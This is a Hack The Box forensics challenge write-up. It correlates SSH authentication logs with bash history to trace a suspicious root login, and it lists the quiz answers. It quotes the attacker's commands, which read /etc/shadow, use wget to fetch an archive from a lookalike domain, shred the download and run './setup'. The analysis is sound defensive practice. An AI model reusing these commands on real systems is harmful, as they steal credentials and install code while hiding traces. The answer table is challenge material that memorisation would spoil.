# 🔎 Hack The Box — An Unusual Sighting


## 🎯 Objective
Analyze SSH authentication logs and Bash command history to identify suspicious login activity and determine what the attacker did after gaining access to the system.

## 📂 Challenge Files
- `sshd.log` — SSH connection and authentication records
- `bash_history.txt` — Recorded shell commands and timestamps

## 🚀 Investigation

### 1. Extract the challenge files

After downloading the challenge ZIP, navigate to the download directory and extract it:

```bash
cd ~/Downloads
unzip forensics_an_unusual_sighting.zip
cd forensics_an_unusual_sighting
ls
```

### 2. Find successful root logins

Search the SSH logs for successful password authentication:

```bash
grep "Accepted password for root" sshd.log
```

This revealed two successful root logins, including one from the suspicious IP address `2.67.182.119`.

### 3. Investigate the suspicious IP

```bash
grep -n "2.67.182.119" sshd.log
```

The relevant log entries showed:

- **Attacker IP:** `2.67.182.119`
- **Attacker source port:** `60071`
- **SSH server:** `100.107.36.130`
- **SSH server port:** `2221`
- **Successful login:** `2024-02-19 04:00:14`
- **Session opened:** `2024-02-19 04:00:14`
- **Disconnect:** `2024-02-19 04:38:17`

### 4. Examine the attacker's command history

```bash
cat bash_history.txt
```

The first command executed after login was:

```bash
whoami
```

The final recorded command before the attacker logged out was:

```bash
./setup
```

Other suspicious commands included:

```bash
uname -a
cat /etc/passwd
cat /etc/shadow
ps faux
wget https://gnu-packages.com/prebuilts/iproute2/latest.tar.gz -O /tmp/latest_iproute.tar.gz
tar xvf latest.tar.gz
shred -zu latest.tar.gz
```

These commands indicate system reconnaissance, access to sensitive account information, downloading an archive, extracting it, and attempting to securely delete the archive before executing the setup script.

### 5. Connect to the challenge quiz

Use Netcat with the challenge host and port supplied by HTB:

```bash
nc 154.57.164.80 43448
```

Answer the quiz using the evidence extracted from the logs and command history.

## 🧠 Key Findings

| Question | Finding |
|---|---|
| SSH server IP and port | `100.107.36.130:2221` |
| First successful login | `2024-02-13 11:29:50` |
| Suspicious login time | `2024-02-19 04:00:14` |
| Attacker IP | `2.67.182.119` |
| First command after login | `whoami` |
| Final recorded command | `./setup` |


## 🏁 Conclusion
This challenge demonstrated how authentication logs and shell history can be correlated to reconstruct suspicious activity on a Linux host. Reviewing both sources helps establish when an attacker accessed a system and what commands they executed afterward.
